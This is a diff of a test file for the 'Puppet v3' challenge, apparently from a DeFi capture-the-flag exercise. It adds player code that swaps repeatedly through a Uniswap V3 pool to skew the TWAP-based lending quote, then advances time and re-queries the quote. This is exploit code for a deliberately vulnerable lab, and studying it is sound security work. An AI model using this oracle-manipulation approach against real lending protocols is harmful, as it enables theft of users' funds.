@@ -165,6 +165,7 @@ describe('[Challenge] Puppet v3', function () {
         const attackPool = await uniswapPool.connect(player);
         const attackLendingPool = await lendingPool.connect(player);
         const attackToken = await token.connect(player);
+        const attackWeth = await weth.connect(player);
 
         const logBalances = async (name, address) => {
             const dvt_bal = await attackToken.balanceOf(address);
@@ -174,6 +175,13 @@ describe('[Challenge] Puppet v3', function () {
             log('DVT:', ethers.utils.formatEther(dvt_bal))
             log('WETH:', ethers.utils.formatEther(weth_bal))
             log('ETH:', ethers.utils.formatEther(eth_bal))
+            log('')
+        };
+
+        const getQuote = async(amountInEth, print=true) => {
+            const quote = await attackLendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther(amountInEth));
+            if (print) log(`Quote of ${amountInEth} ETH is ${ethers.utils.formatEther(quote)}`)
+            return quote
         }
 
         await logBalances("Player", player.address)
@@ -187,16 +195,14 @@ describe('[Challenge] Puppet v3', function () {
             attackPool.address
         );
 
-        log(attackPuppet.address)
-        // await attackPuppet.performSwap();
         console.log(await attackToken.balanceOf(player.address));
 
 
-        // console.log(await attackPool.slot0())
 
         const uniswapRouter = new ethers.Contract("0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", routerJson.abi, player);
-        await attackToken.approve(uniswapRouter.address, await attackToken.balanceOf(player.address));
+        await attackToken.approve(uniswapRouter.address, ethers.constants.MaxUint256);
 
+        await getQuote("1")
 
         await uniswapRouter.exactInputSingle(
             [attackToken.address,
@@ -213,6 +219,48 @@ describe('[Challenge] Puppet v3', function () {
 
         await logBalances("Player", player.address)
         await logBalances("Pool", attackPool.address)
+
+        await attackWeth.approve(uniswapRouter.address, ethers.constants.MaxUint256);
+
+        for (let i = 0; i < 19; i++) {
+            await uniswapRouter.exactInputSingle(
+                [
+                weth.address,   
+                attackToken.address,
+                3000,
+                player.address,
+                10n * 10n ** 18n, // 10 WETH TOKENS
+                0,
+                0],
+                {
+                    gasLimit: 1e7
+                }
+            );
+            await logBalances("pool", attackPool.address)
+            await logBalances("player", player.address)
+            await uniswapRouter.exactOutputSingle(
+                [
+                attackToken.address,
+                weth.address,   
+                3000,
+                player.address,
+                9n * 10n ** 18n, // 10 WETH TOKENS
+                999n * 10n ** 18n, // max in
+                0],
+                {
+                    gasLimit: 1e7
+                }
+            );
+            log("i =", i)
+            await logBalances("pool", attackPool.address)
+            await logBalances("player", player.address)
+
+        }
+        console.log(await attackPool.slot0())
+
+        await logBalances("pool", attackPool.address)
+        await time.increase(60);
+        await getQuote("1")
 
         return;
 
